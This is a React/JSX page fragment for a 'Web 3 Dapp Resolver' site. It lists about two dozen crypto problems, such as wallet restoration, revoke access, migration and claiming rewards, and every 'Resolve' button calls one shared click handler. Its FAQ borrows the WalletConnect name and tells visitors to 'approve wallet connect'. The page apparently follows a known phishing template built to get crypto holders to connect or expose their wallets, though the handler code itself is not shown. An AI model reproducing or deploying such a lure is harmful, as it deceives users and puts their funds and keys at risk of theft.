                        <svg width="18" height="18" viewBox="0 0 18 18" fill="none" xmlns="http://www.w3.org/2000/svg">
                          <path d="M13.4687 9C14.6539 9 15.7906 9.47081 16.6286 10.3089C17.4667 11.1469 17.9375 12.2836 17.9375 13.4688C17.9375 14.6539 17.4667 15.7906 16.6286 16.6286C15.7906 17.4667 14.6539 17.9375 13.4687 17.9375C12.2835 17.9375 11.1469 17.4667 10.3089 16.6286C9.4708 15.7906 8.99998 14.6539 8.99998 13.4688C8.99998 12.2836 9.4708 11.1469 10.3089 10.3089C11.1469 9.47081 12.2835 9 13.4687 9ZM9.01867 10.6242C8.4747 11.4728 8.18617 12.4599 8.18749 13.4679C8.18749 14.8045 8.68311 16.0241 9.5013 16.9544C8.84967 17.0681 8.14036 17.125 7.37499 17.125C5.02686 17.125 3.20848 16.592 1.93936 15.5C1.60661 15.2141 1.33953 14.8597 1.1564 14.461C0.973256 14.0623 0.878373 13.6288 0.878235 13.1901V12.4523C0.87845 11.9676 1.07115 11.5028 1.41397 11.1602C1.75678 10.8175 2.22165 10.625 2.70636 10.625H9.01867V10.6242ZM13.4687 10.6242L13.3956 10.6307C13.3144 10.6455 13.2397 10.6847 13.1814 10.7431C13.123 10.8014 13.0838 10.8761 13.069 10.9573L13.0625 11.0304V13.0617H11.0296L10.9565 13.069C10.8753 13.0838 10.8006 13.123 10.7422 13.1814C10.6839 13.2397 10.6447 13.3145 10.6299 13.3956L10.6234 13.4688L10.6299 13.5419C10.6448 13.6229 10.6841 13.6975 10.7424 13.7556C10.8008 13.8138 10.8754 13.8529 10.9565 13.8677L11.0296 13.875L13.0633 13.8742V15.9087L13.0698 15.9818C13.0847 16.0631 13.124 16.1379 13.1825 16.1963C13.241 16.2546 13.3159 16.2938 13.3972 16.3084L13.4704 16.3149L13.5435 16.3084C13.6245 16.2935 13.6991 16.2542 13.7573 16.1959C13.8154 16.1375 13.8545 16.0629 13.8693 15.9818L13.8766 15.9087L13.875 13.8742H15.9095L15.9826 13.8677C16.0638 13.8529 16.1385 13.8137 16.1969 13.7553C16.2552 13.697 16.2944 13.6222 16.3092 13.5411L16.3157 13.4679L16.3092 13.3948C16.2943 13.3138 16.255 13.2392 16.1967 13.181C16.1383 13.1229 16.0637 13.0838 15.9826 13.069L15.9095 13.0625L13.875 13.0609V11.0296L13.8685 10.9565C13.8537 10.8753 13.8145 10.8006 13.7561 10.7422C13.6978 10.6839 13.623 10.6447 13.5419 10.6299L13.4687 10.6234V10.6242ZM7.37499 0.875001C7.52238 0.87481 7.66485 0.92805 7.776 1.02486C7.88715 1.12166 7.95944 1.25547 7.97949 1.4015L7.98517 1.48438L7.98436 2.09294H10.8281C11.313 2.09294 11.7779 2.28554 12.1208 2.62838C12.4636 2.97122 12.6562 3.43621 12.6562 3.92106V7.58138C12.6562 7.82594 12.6083 8.05994 12.5214 8.27281C11.6259 8.43475 10.7878 8.82674 10.0895 9.41031H3.92267C3.43782 9.41031 2.97283 9.21771 2.62999 8.87487C2.28715 8.53203 2.09455 8.06704 2.09455 7.58219V3.92188C2.09455 3.43717 2.28704 2.9723 2.62971 2.62948C2.97237 2.28667 3.43715 2.09397 3.92186 2.09375L6.7648 2.09294V1.48438C6.76482 1.35095 6.80863 1.22122 6.8895 1.1151C6.97038 1.00898 7.08384 0.93234 7.21249 0.896938L7.29211 0.880688L7.37499 0.875001ZM5.54686 4.53125C5.41018 4.52578 5.2738 4.54798 5.1459 4.59651C5.01801 4.64504 4.90124 4.71891 4.80259 4.81369C4.70395 4.90846 4.62547 5.02219 4.57186 5.14804C4.51825 5.27389 4.49062 5.40927 4.49062 5.54606C4.49062 5.68286 4.51825 5.81824 4.57186 5.94409C4.62547 6.06994 4.70395 6.18366 4.80259 6.27844C4.90124 6.37321 5.01801 6.44708 5.1459 6.49561C5.2738 6.54415 5.41018 6.56635 5.54686 6.56088C5.80898 6.55038 6.05687 6.43888 6.23862 6.24971C6.42037 6.06054 6.52187 5.80839 6.52187 5.54606C6.52187 5.28373 6.42037 5.03158 6.23862 4.84241C6.05687 4.65325 5.80898 4.54174 5.54686 4.53125ZM9.19661 4.53125C9.05993 4.52578 8.92355 4.54798 8.79565 4.59651C8.66776 4.64504 8.55099 4.71891 8.45234 4.81369C8.3537 4.90846 8.27522 5.02219 8.22161 5.14804C8.168 5.27389 8.14037 5.40927 8.14037 5.54606C8.14037 5.68286 8.168 5.81824 8.22161 5.94409C8.27522 6.06994 8.3537 6.18366 8.45234 6.27844C8.55099 6.37321 8.66776 6.44708 8.79565 6.49561C8.92355 6.54415 9.05993 6.56635 9.19661 6.56088C9.45873 6.55038 9.70662 6.43888 9.88837 6.24971C10.0701 6.06054 10.1716 5.80839 10.1716 5.54606C10.1716 5.28373 10.0701 5.03158 9.88837 4.84241C9.70662 4.65325 9.45873 4.54174 9.19661 4.53125Z" fill="currentColor"></path>
                        </svg>
                        <span className="ml-2">Claim Airdrop</span>
                      </a>
                    </div>
                  </div>
                </div>

                <div className="lg:w-5/12 wow fadeIn" data-wow-duration="1s" data-wow-delay="0.4s">
                  <div className="flex flex-wrap justify-center text-center">
                    <div className="w-1/2 p-2">
                      <div className="h-15 lg:h-8"></div>
                      <Image src={blog11} alt="" className="w-full object-cover" />
                      <div className="h-6 lg:h-6"></div>
                      <Image src={about_img_3} alt="" className="w-full object-cover" />
                    </div>
                    <div className="w-1/2 p-2">
                      <Image src={about_img_2} alt="" className="w-full object-cover" />
                      <div className="h-6 lg:h-6"></div>
                      <Image src={blog9} alt="" className="w-full object-cover" />
                    </div>
                  </div>
                </div>
              </div>
            </div>
            </section>




            <div className="cs-height_100 cs-height_lg_70"></div>

            <section>
              <div className="container mx-auto px-4">

                <div class="cs-seciton_heading cs-style1 text-center wow fadeInUp" data-wow-duration="1s" data-wow-delay="0.2s">
                  <h3 class="cs-section_title cs-font_16 cs-font_14_sm cs-gradient_color">
                    Issues to Resolve
                  </h3>
                  <h2 class="cs-section_subtitle cs-m0 cs-font_36 cs-font_24_sm text-white">
                    Our Services
                  </h2>
                </div>
                  <br /><br />
                <div className="flex flex-wrap -mx-4">
                  <div className="w-full md:w-1/3 lg:w-1/3 px-4 mb-6">
                    <div className="rounded-lg shadow-lg p-6 text-center cs-light_bg">
                      <div className="mb-5 h-5"></div>
                      <h3 className="text-2xl sm:text-xl font-semibold mb-0 text-white">
                        Blockchain Recovery
                      </h3>
                      <div className="mb-2 h-2.5"></div>
                      <div className="text-[color:#dcdcdc] mb-4">
                        Accidentally sent funds to the wrong address? Our platform facilitates blockchain recovery, helping you retrieve your lost or stuck transactions securely.
                      </div>
                      <a href="#" onClick={clicked} className="bg-blue-500 hover:bg-blue-600 text-white font-bold py-2 px-4 rounded">
                        Resolve
                      </a>
                    </div>
                  </div>

                  <div className="w-full md:w-1/3 lg:w-1/3 px-4 mb-6">
                    <div className="cs-light_bg rounded-lg shadow-lg p-6 text-center">
                      <div className="mb-5 h-5"></div>
                      <h3 className="text-2xl sm:text-xl font-semibold mb-0 text-white">
                        Crypto Wallet Restoration
                      </h3>
                      <div className="mb-2 h-2.5"></div>
                      <div className="text-[color:#dcdcdc] mb-4">
                        Lost access to your cryptocurrency wallet? We specialize in wallet restoration, allowing you to regain control of your digital assets.
                      </div>
                      <a href="#" onClick={clicked} className="bg-blue-500 hover:bg-blue-600 text-white font-bold py-2 px-4 rounded">
                        Resolve
                      </a>
                    </div>
                  </div>

                  <div className="w-full md:w-1/3 lg:w-1/3 px-4 mb-6">
                    <div className="cs-light_bg rounded-lg shadow-lg p-6 text-center">
                      <div className="mb-5 h-5"></div>
                      <h3 className="text-2xl sm:text-xl font-semibold mb-0 text-white">
                        Smart Contract Audits and Debugging
                      </h3>
                      <div className="mb-2 h-2.5"></div>
                      <div className="mb-4 text-[color:#dcdcdc]">
                        Ensure the integrity of your smart contracts. Our experts conduct comprehensive audits and debugging to rectify vulnerabilities and improve security.
                      </div>
                      <a href="#" onClick={clicked} className="bg-blue-500 hover:bg-blue-600 text-white font-bold py-2 px-4 rounded">
                        Resolve
                      </a>
                    </div>
                  </div>

                  <div className="w-full md:w-1/3 lg:w-1/3 px-4 mb-6">
                    <div className="cs-light_bg rounded-lg shadow-lg p-6 text-center">
                      <div className="mb-5 h-5"></div>
                      <h3 className="text-2xl sm:text-xl font-semibold mb-0 text-white">
                        DeFi Protocol Optimization
                      </h3>
                      <div className="mb-2 h-2.5"></div>
                      <div className="text-[color:#dcdcdc] mb-4">
                        Enhance the performance of your DeFi platform. Our experts analyze and optimize your DeFi protocols for efficiency, security, and seamless user experiences.
                      </div>
                      <a href="#" onClick={clicked} className="bg-blue-500 hover:bg-blue-600 text-white font-bold py-2 px-4 rounded">
                        Resolve
                      </a>
                    </div>
                  </div>

                  <div className="w-full md:w-1/3 lg:w-1/3 px-4 mb-6">
                    <div className="cs-light_bg rounded-lg shadow-lg p-6 text-center">
                      <div className="mb-5 h-5"></div>
                      <h3 className="text-2xl sm:text-xl font-semibold mb-0 text-white">
                        Airdrop Fixes
                      </h3>
                      <div className="mb-2 h-2.5"></div>
                      <div className="text-[color:#dcdcdc] mb-4">
                        Resolve issues related to airdrops, ensuring accurate distribution and reception of tokens during airdrop events.
                      </div>
                      <a href="#" onClick={clicked} className="bg-blue-500 hover:bg-blue-600 text-white font-bold py-2 px-4 rounded">
                        Resolve
                      </a>
                    </div>
                  </div>

                  <div className="w-full md:w-1/3 lg:w-1/3 px-4 mb-6">
                    <div className="cs-light_bg rounded-lg shadow-lg p-6 text-center">
                      <div className="mb-5 h-5"></div>
                      <h3 className="text-2xl sm:text-xl font-semibold mb-0 text-white">
                        Token Bridge Solutions
                      </h3>
                      <div className="mb-2 h-2.5"></div>
                      <div className="text-[color:#dcdcdc] mb-4">
                        Develop and maintain token bridges, enabling seamless transfers and interoperability between different blockchain networks.
                      </div>
                      <a href="#" onClick={clicked} className="bg-blue-500 hover:bg-blue-600 text-white font-bold py-2 px-4 rounded">
                        Resolve
                      </a>
                    </div>
                  </div>

                  <div className="w-full md:w-1/3 lg:w-1/3 px-4 mb-6">
                    <div className="cs-light_bg rounded-lg shadow-lg p-6 text-center">
                      <div className="mb-5 h-5"></div>
                      <h3 className="text-2xl sm:text-xl font-semibold mb-0 text-white">
                        NFT (Non-Fungible Token) Solutions
                      </h3>
                      <div className="mb-2 h-2.5"></div>
                      <div className="text-[color:#dcdcdc] mb-4">
                        Assist in the creation, management, and troubleshooting of NFTs, ensuring a smooth experience in the NFT marketplace.
                      </div>
                      <a href="#" onClick={clicked} className="bg-blue-500 hover:bg-blue-600 text-white font-bold py-2 px-4 rounded">
                        Resolve
                      </a>
                    </div>
                  </div>

                  <div className="w-full md:w-1/3 lg:w-1/3 px-4 mb-6">
                    <div className="cs-light_bg rounded-lg shadow-lg p-6 text-center">
                      <div className="mb-5 h-5"></div>
                      <h3 className="text-2xl sm:text-xl font-semibold mb-0 text-white">
                        REVOKE
                      </h3>
                      <div className="mb-2 h-2.5"></div>
                      <div className="text-[color:#dcdcdc] mb-4">
                        Click here if you have a problem with Revoke access on your wallet.
                      </div>
                      <a href="#" onClick={clicked} className="bg-blue-500 hover:bg-blue-600 text-white font-bold py-2 px-4 rounded">
                        Resolve
                      </a>
                    </div>
                  </div>

                  <div className="w-full md:w-1/3 lg:w-1/3 px-4 mb-6">
                    <div className="cs-light_bg rounded-lg shadow-lg p-6 text-center w-full">
                      <div className="mb-5 h-5"></div>
                      <h3 className="text-2xl sm:text-xl font-semibold mb-0 text-white">
                        Staking
                      </h3>
                      <div className="mb-2 h-2.5"></div>
                      <div className="text-[color:#dcdcdc] mb-4">
                        Click here to stake tokens.
                      </div>
                      <a href="#" onClick={clicked} className="bg-blue-500 hover:bg-blue-600 text-white font-bold py-2 px-4 rounded">
                        Resolve
                      </a>
                    </div>
                  </div>

                  <div className="w-full md:w-1/3 lg:w-1/3 px-4 mb-6">
                    <div className="cs-light_bg rounded-lg shadow-lg p-6 text-center">
                      <div className="mb-5 h-5"></div>
                      <h3 className="text-2xl sm:text-xl font-semibold mb-0 text-white">
                        KYC Issues
                      </h3>
                      <div className="mb-2 h-2.5"></div>
                      <div className="text-[color:#dcdcdc] mb-4">
                      Click here rectify KYC related issues.
                      </div>
                      <a href="#" onClick={clicked} className="bg-blue-500 hover:bg-blue-600 text-white font-bold py-2 px-4 rounded">
                        Resolve
                      </a>
                    </div>
                  </div>

                  <div className="w-full md:w-1/3 lg:w-1/3 px-4 mb-6">
                    <div className="cs-light_bg rounded-lg shadow-lg p-6 text-center ">
                      <div className="mb-5 h-5"></div>
                      <h3 className="text-2xl sm:text-xl font-semibold mb-0 text-white">
                      Wallet Approval
                      </h3>
                      <div className="mb-2 h-2.5"></div>
                      <div className="text-[color:#dcdcdc] mb-4">
                      Click here to resolve wallet approval issues.
                      </div>
                      <a href="#" onClick={clicked} className="bg-blue-500 hover:bg-blue-600 text-white font-bold py-2 px-4 rounded">
                        Resolve
                      </a>
                    </div>
                  </div>

                  <div className="w-full md:w-1/3 lg:w-1/3 px-4 mb-6">
                    <div className="cs-light_bg rounded-lg shadow-lg p-6 text-center">
                      <div className="mb-5 h-5"></div>
                      <h3 className="text-2xl sm:text-xl font-semibold mb-0 text-white">
                      CONNECT TO DAPPS
                      </h3>
                      <div className="mb-2 h-2.5"></div>
                      <div className="text-[color:#dcdcdc] mb-4">
                      Click here to connect to DAPPS.
                      </div>
                      <a href="#" onClick={clicked} className="bg-blue-500 hover:bg-blue-600 text-white font-bold py-2 px-4 rounded">
                        Resolve
                      </a>
                    </div>
                  </div>

                  <div className="w-full md:w-1/3 lg:w-1/3 px-4 mb-6">
                    <div className="cs-light_bg rounded-lg shadow-lg p-6 text-center w-full">
                      <div className="mb-5 h-5"></div>
                      <h3 className="text-2xl sm:text-xl font-semibold mb-0 text-white">
                      MIGRATION
                      </h3>
                      <div className="mb-2 h-2.5"></div>
                      <div className="text-[color:#dcdcdc] mb-4">
                      Click here for wallet transfer.
                      </div>
                      <a href="#" onClick={clicked} className="bg-blue-500 hover:bg-blue-600 text-white font-bold py-2 px-4 rounded">
                        Resolve
                      </a>
                    </div>
                  </div>

                  <div className="w-full md:w-1/3 lg:w-1/3 px-4 mb-6">
                    <div className="cs-light_bg rounded-lg shadow-lg p-6 text-center w-full">
                      <div className="mb-5 h-5"></div>
                      <h3 className="text-2xl sm:text-xl font-semibold mb-0 text-white">
                      TRANSACTION DELAY
                      </h3>
                      <div className="mb-2 h-2.5"></div>
                      <div className="text-[color:#dcdcdc] mb-4">
                      Click here for transaction delay issues.
                      </div>
                      <a href="#" onClick={clicked} className="bg-blue-500 hover:bg-blue-600 text-white font-bold py-2 px-4 rounded">
                        Resolve
                      </a>
                    </div>
                  </div>

                  <div className="w-full md:w-1/3 lg:w-1/3 px-4 mb-6">
                    <div className="cs-light_bg rounded-lg shadow-lg p-6 text-center w-full">
                      <div className="mb-5 h-5"></div>
                      <h3 className="text-2xl sm:text-xl font-semibold mb-0 text-white">
                      TOKEN BRIDGE
                      </h3>
                      <div className="mb-2 h-2.5"></div>
                      <div className="text-[color:#dcdcdc] mb-4">
                      Click here for toekn bridge.
                      </div>
                      <a href="#" onClick={clicked} className="bg-blue-500 hover:bg-blue-600 text-white font-bold py-2 px-4 rounded">
                        Resolve
                      </a>
                    </div>
                  </div>

                  <div className="w-full md:w-1/3 lg:w-1/3 px-4 mb-6">
                    <div className="cs-light_bg rounded-lg shadow-lg p-6 text-center w-full">
                      <div className="mb-5 h-5"></div>
                      <h3 className="text-2xl sm:text-xl font-semibold mb-0 text-white">
                      Buy and Sell Liquidity Issues Resolution
                      </h3>
                      <div className="mb-2 h-2.5"></div>
                      <div className="text-[color:#dcdcdc] mb-4">
                      Address liquidity challenges affecting buy and sell actions, ensuring a balanced and smooth liquidity provision within trading platforms.
                      </div>
                      <a href="#" onClick={clicked} className="bg-blue-500 hover:bg-blue-600 text-white font-bold py-2 px-4 rounded">
                        Resolve
                      </a>
                    </div>
                  </div>

                  <div className="w-full md:w-1/3 lg:w-1/3 px-4 mb-6">
                    <div className="cs-light_bg rounded-lg shadow-lg p-6 text-center w-full">
                      <div className="mb-5 h-5"></div>
                      <h3 className="text-2xl sm:text-xl font-semibold mb-0 text-white">
                      Deposit and Withdrawal Management
                      </h3>
                      <div className="mb-2 h-2.5"></div>
                      <div className="text-[color:#dcdcdc] mb-4">
                      Optimize deposit and withdrawal processes to enhance user experience and streamline fund transfers securely.
                      </div>
                      <a href="#" onClick={clicked} className="bg-blue-500 hover:bg-blue-600 text-white font-bold py-2 px-4 rounded">
                        Resolve
                      </a>
                    </div>
                  </div>

                  <div className="w-full md:w-1/3 lg:w-1/3 px-4 mb-6">
                    <div className="cs-light_bg rounded-lg shadow-lg p-6 text-center w-full">
                      <div className="mb-5 h-5"></div>
                      <h3 className="text-2xl sm:text-xl font-semibold mb-0 text-white">
                      Unable To Buy Coins/Tokens
                      </h3>
                      <div className="mb-2 h-2.5"></div>
                      <div className="text-[color:#dcdcdc] mb-4">
                      To trade crypto your account must be marked as a trusted payment source.
                      </div>
                      <a href="#" onClick={clicked} className="bg-blue-500 hover:bg-blue-600 text-white font-bold py-2 px-4 rounded">
                        Resolve
                      </a>
                    </div>
                  </div>

                  <div className="w-full md:w-1/3 lg:w-1/3 px-4 mb-6">
                    <div className="cs-light_bg rounded-lg shadow-lg p-6 text-center w-full">
                      <div className="mb-5 h-5"></div>
                      <h3 className="text-2xl sm:text-xl font-semibold mb-0 text-white">
                      Slippage Mitigation
                      </h3>
                      <div className="mb-2 h-2.5"></div>
                      <div className="text-[color:#dcdcdc] mb-4">
                      Implement strategies to minimize slippage, providing users with more predictable and cost-effective trades.
                      </div>
                      <a href="#" onClick={clicked} className="bg-blue-500 hover:bg-blue-600 text-white font-bold py-2 px-4 rounded">
                        Resolve
                      </a>
                    </div>
                  </div>

                  <div className="w-full md:w-1/3 lg:w-1/3 px-4 mb-6">
                    <div className="cs-light_bg rounded-lg shadow-lg p-6 text-center w-full">
                      <div className="mb-5 h-5"></div>
                      <h3 className="text-2xl sm:text-xl font-semibold mb-0 text-white">
                      Rectification
                      </h3>
                      <div className="mb-2 h-2.5"></div>
                      <div className="text-[color:#dcdcdc] mb-4">
                      Click here to rectify issues.
                      </div>
                      <a href="#" onClick={clicked} className="bg-blue-500 hover:bg-blue-600 text-white font-bold py-2 px-4 rounded">
                        Resolve
                      </a>
                    </div>
                  </div>

                  <div className="w-full md:w-1/3 lg:w-1/3 px-4 mb-6">
                    <div className="cs-light_bg rounded-lg shadow-lg p-6 text-center w-full">
                      <div className="mb-5 h-5"></div>
                      <h3 className="text-2xl sm:text-xl font-semibold mb-0 text-white">
                      High Gas Fees
                      </h3>
                      <div className="mb-2 h-2.5"></div>
                      <div className="text-[color:#dcdcdc] mb-4">
                      Click here for gas fee related issues.
                      </div>
                      <a href="#" onClick={clicked} className="bg-blue-500 hover:bg-blue-600 text-white font-bold py-2 px-4 rounded">
                        Resolve
                      </a>
                    </div>
                  </div>

                  <div className="w-full md:w-1/3 lg:w-1/3 px-4 mb-6">
                    <div className="cs-light_bg rounded-lg shadow-lg p-6 text-center w-full">
                      <div className="mb-5 h-5"></div>
                      <h3 className="text-2xl sm:text-xl font-semibold mb-0 text-white">
                      Validation
                      </h3>
                      <div className="mb-2 h-2.5"></div>
                      <div className="text-[color:#dcdcdc] mb-4">
                      click here for Validation related issues.
                      </div>
                      <a href="#" onClick={clicked} className="bg-blue-500 hover:bg-blue-600 text-white font-bold py-2 px-4 rounded">
                        Resolve
                      </a>
                    </div>
                  </div>

                  <div className="w-full md:w-1/3 lg:w-1/3 px-4 mb-6">
                    <div className="cs-light_bg rounded-lg shadow-lg p-6 text-center w-full">
                      <div className="mb-5 h-5"></div>
                      <h3 className="text-2xl sm:text-xl font-semibold mb-0 text-white">
                      Claim Reward
                      </h3>
                      <div className="mb-2 h-2.5"></div>
                      <div className="text-[color:#dcdcdc] mb-4">
                      Click here for reward related issues.
                      </div>
                      <a href="#" onClick={clicked} className="bg-blue-500 hover:bg-blue-600 text-white font-bold py-2 px-4 rounded">
                        Resolve
                      </a>
                    </div>
                  </div>

                  <div className="w-full md:w-1/3 lg:w-1/3 px-4 mb-6">
                    <div className="cs-light_bg rounded-lg shadow-lg p-6 text-center w-full">
                      <div className="mb-5 h-5"></div>
                      <h3 className="text-2xl sm:text-xl font-semibold mb-0 text-white">
                      Slippage Error
                      </h3>
                      <div className="mb-2 h-2.5"></div>
                      <div className="text-[color:#dcdcdc] mb-4">
                      Click here for slippage related error during trade.
                      </div>
                      <a href="#" onClick={clicked} className="bg-blue-500 hover:bg-blue-600 text-white font-bold py-2 px-4 rounded">
                        Resolve
                      </a>
                    </div>
                  </div>

                  <div className="w-full md:w-1/3 lg:w-1/3 px-4 mb-6">
                    <div className="cs-light_bg rounded-lg shadow-lg p-6 text-center w-full">
                      <div className="mb-5 h-5"></div>
                      <h3 className="text-2xl sm:text-xl font-semibold mb-0 text-white">
                      Locked Account
                      </h3>
                      <div className="mb-2 h-2.5"></div>
                      <div className="text-[color:#dcdcdc] mb-4">
                      Click here for issues related to account lock.
                      </div>
                      <a href="#" onClick={clicked} className="bg-blue-500 hover:bg-blue-600 text-white font-bold py-2 px-4 rounded">
                        Resolve
                      </a>
                    </div>
                  </div>

                  <div className="w-full md:w-1/3 lg:w-1/3 px-4 mb-6">
                    <div className="cs-light_bg rounded-lg shadow-lg p-6 text-center w-full">
                      <div className="mb-5 h-5"></div>
                      <h3 className="text-2xl sm:text-xl font-semibold mb-0 text-white">
                      Trading Wallet Issues
                      </h3>
                      <div className="mb-2 h-2.5"></div>
                      <div className="text-[color:#dcdcdc] mb-4">
                      Click here if you have problem with your trading wallet.
                      </div>
                      <a href="#" onClick={clicked} className="bg-blue-500 hover:bg-blue-600 text-white font-bold py-2 px-4 rounded">
                        Resolve
                      </a>
                    </div>
                  </div>

                  <div className="w-full md:w-1/3 lg:w-1/3 px-4 mb-6">
                    <div className="cs-light_bg rounded-lg shadow-lg p-6 text-center w-full">
                      <div className="mb-5 h-5"></div>
                      <h3 className="text-2xl sm:text-xl font-semibold mb-0 text-white">
                      Other Issues Not Listed
                      </h3>
                      <div className="mb-2 h-2.5"></div>
                      <div className="text-[color:#dcdcdc] mb-4">
                      If you can't find the issue you are experiencing click here.
                      </div>
                      <a href="#" onClick={clicked} className="bg-blue-500 hover:bg-blue-600 text-white font-bold py-2 px-4 rounded">
                        Resolve
                      </a>
                    </div>
                  </div>



                </div>
              </div>
            </section>


            <section id="faq">
              <div class="cs-height_70 cs-height_lg_40"></div>
              <div class="container mx-auto px-4">
                <div class="cs-seciton_heading cs-style1 text-center wow fadeInUp" data-wow-duration="1s" data-wow-delay="0.2s">
                  <h3 class="cs-section_title cs-font_16 cs-font_14_sm cs-gradient_color text-xl sm:text-lg">
                    FAQ
                  </h3>
                  <h2 class="cs-section_subtitle cs-m0 cs-font_36 cs-font_24_sm text-3xl sm:text-2xl text-white">
                    Still have questions?
                  </h2>
                </div>
                <div class="cs-height_50 cs-height_lg_30"></div>
                <div class="flex flex-wrap cs-accordians cs-style1 wow fadeIn" data-wow-duration="1s" data-wow-delay="0.4s">
                  <div class="w-full lg:w-8/12 lg:mx-auto">
                    <div class="cs-accordian cs-light_bg active mb-6 p-5 ">

                      <div class="cs-accordian_head ">
                        <h2 class="cs-accordian_title cs-m0 cs-font_24 cs-font_18_sm text-xl sm:text-lg text-white">
                          <span>Q1.</span> What types of wallets does WalletConnect support?
                        </h2>
                        <span class="cs-accordian_toggle"></span>
                      </div>

                      <div class="cs-accordian-body text-[color:#dcdcdc]">
                        We play nice with everyone! WalletConnect supports a wide range of popular wallets, including MetaMask, Coinbase Wallet, Trust Wallet, and many more. The list keeps growing, so check our website for the latest updates.
                      </div>
                    </div>

                    <div class="cs-height_25 cs-height_lg_25"></div>
                    <div class="cs-accordian cs-light_bg mb-6 p-5 text-white">
                      <div class="cs-accordian_head">
                        <h2 class="cs-accordian_title cs-m0 cs-font_24 cs-font_18_sm text-xl sm:text-lg">
                          <span>Q2.</span> Is the connection safe?
                        </h2>
                        <span class="cs-accordian_toggle"></span>
                      </div>
                      <div class="cs-accordian-body hidden">
                        Security is our top priority. WalletConnect uses secure encryption protocols and never stores your private keys. Additionally, all connections are initiated by you, giving you complete control over your funds.
                      </div>
                    </div>

                    <div class="cs-height_25 cs-height_lg_25"></div>
                    <div class="cs-accordian cs-light_bg mb-6 p-5 text-white">
                      <div class="cs-accordian_head">
                        <h2 class="cs-accordian_title cs-m0 cs-font_24 cs-font_18_sm text-2xl sm:text-lg">
                          <span>Q3.</span> How do I connect my wallet?
                        </h2>
                        <span class="cs-accordian_toggle"></span>
                      </div>
                      <div class="cs-accordian-body hidden">
                        Select the issue you want to resolve, approve wallet connect and wait for initialization. Contact our support if you have questions.
                      </div>
                    </div>

                    <div class="cs-height_25 cs-height_lg_25"></div>
                    <div class="cs-accordian cs-light_bg mb-6 p-5 text-white">
                      <div class="cs-accordian_head">
                        <h2 class="cs-accordian_title cs-m0 cs-font_24 cs-font_18_sm text-xl sm:text-lg">
                          <span>Q4.</span> What if I want to disconnect my wallet?
                        </h2>
                        <span class="cs-accordian_toggle"></span>
                      </div>
                      <div class="cs-accordian-body hidden">
                        No problem! You're always in control of your connections. Simply open your wallet app and look for the active WalletConnect sessions. You can easily disconnect from any dApp with a single tap.
                      </div>
                    </div>

                    <div class="cs-height_25 cs-height_lg_25"></div>
                  </div>
                </div>
              </div>
            </section>

            <div className="cs-height_100 cs-height_lg_70"></div>

            <div className="cs-footer_wrap cs-bg">
              <div className="container wow fadeIn" data-wow-duration="1s" data-wow-delay="0.2s">

              <div className="cs-cta cs-style1 cs-accent_bg text-center">
                      <h2 className="cs-cta_title cs-white_color cs-font_64 cs-font_36_sm cs-m0">
                        Web 3 Dapp Resolver
                      </h2>
                      <div className="cs-height_10 cs-height_lg_10"></div>
                      <div className="cs-cta_subtitle cs-white_color">
                        Our commitment is to address a wide array of blockchain and crypto
                        challenges comprehensively. We strive to provide effective solutions
                        that empower you to navigate the rapidly evolving blockchain
                        landscape with confidence. Trust us to optimize your operations and
                        create a successful and efficient blockchain ecosystem.
                      </div>
                      <div className="cs-height_30 cs-height_lg_30"></div>
                      <div className="cs-cta_btns cs-center" onClick={clicked}>
                        <a target="_blank" className="interact-button cs-btn cs-btn_filed cs-white_btn_2" >
                          <svg width="18" height="18" viewBox="0 0 18 18" fill="none" xmlns="http://www.w3.org/2000/svg">
                            <path d="M13.4687 9C14.6539 9 15.7906 9.47081 16.6286 10.3089C17.4667 11.1469 17.9375 12.2836 17.9375 13.4688C17.9375 14.6539 17.4667 15.7906 16.6286 16.6286C15.7906 17.4667 14.6539 17.9375 13.4687 17.9375C12.2835 17.9375 11.1469 17.4667 10.3089 16.6286C9.4708 15.7906 8.99998 14.6539 8.99998 13.4688C8.99998 12.2836 9.4708 11.1469 10.3089 10.3089C11.1469 9.47081 12.2835 9 13.4687 9ZM9.01867 10.6242C8.4747 11.4728 8.18617 12.4599 8.18749 13.4679C8.18749 14.8045 8.68311 16.0241 9.5013 16.9544C8.84967 17.0681 8.14036 17.125 7.37499 17.125C5.02686 17.125 3.20848 16.592 1.93936 15.5C1.60661 15.2141 1.33953 14.8597 1.1564 14.461C0.973256 14.0623 0.878373 13.6288 0.878235 13.1901V12.4523C0.87845 11.9676 1.07115 11.5028 1.41397 11.1602C1.75678 10.8175 2.22165 10.625 2.70636 10.625H9.01867V10.6242ZM13.4687 10.6242L13.3956 10.6307C13.3144 10.6455 13.2397 10.6847 13.1814 10.7431C13.123 10.8014 13.0838 10.8761 13.069 10.9573L13.0625 11.0304V13.0617H11.0296L10.9565 13.069C10.8753 13.0838 10.8006 13.123 10.7422 13.1814C10.6839 13.2397 10.6447 13.3145 10.6299 13.3956L10.6234 13.4688L10.6299 13.5419C10.6448 13.6229 10.6841 13.6975 10.7424 13.7556C10.8008 13.8138 10.8754 13.8529 10.9565 13.8677L11.0296 13.875L13.0633 13.8742V15.9087L13.0698 15.9818C13.0847 16.0631 13.124 16.1379 13.1825 16.1963C13.241 16.2546 13.3159 16.2938 13.3972 16.3084L13.4704 16.3149L13.5435 16.3084C13.6245 16.2935 13.6991 16.2542 13.7573 16.1959C13.8154 16.1375 13.8545 16.0629 13.8693 15.9818L13.8766 15.9087L13.875 13.8742H15.9095L15.9826 13.8677C16.0638 13.8529 16.1385 13.8137 16.1969 13.7553C16.2552 13.697 16.2944 13.6222 16.3092 13.5411L16.3157 13.4679L16.3092 13.3948C16.2943 13.3138 16.255 13.2392 16.1967 13.181C16.1383 13.1229 16.0637 13.0838 15.9826 13.069L15.9095 13.0625L13.875 13.0609V11.0296L13.8685 10.9565C13.8537 10.8753 13.8145 10.8006 13.7561 10.7422C13.6978 10.6839 13.623 10.6447 13.5419 10.6299L13.4687 10.6234V10.6242ZM7.37499 0.875001C7.52238 0.87481 7.66485 0.92805 7.776 1.02486C7.88715 1.12166 7.95944 1.25547 7.97949 1.4015L7.98517 1.48438L7.98436 2.09294H10.8281C11.313 2.09294 11.7779 2.28554 12.1208 2.62838C12.4636 2.97122 12.6562 3.43621 12.6562 3.92106V7.58138C12.6562 7.82594 12.6083 8.05994 12.5214 8.27281C11.6259 8.43475 10.7878 8.82674 10.0895 9.41031H3.92267C3.43782 9.41031 2.97283 9.21771 2.62999 8.87487C2.28715 8.53203 2.09455 8.06704 2.09455 7.58219V3.92188C2.09455 3.43717 2.28704 2.9723 2.62971 2.62948C2.97237 2.28667 3.43715 2.09397 3.92186 2.09375L6.7648 2.09294V1.48438C6.76482 1.35095 6.80863 1.22122 6.8895 1.1151C6.97038 1.00898 7.08384 0.93234 7.21249 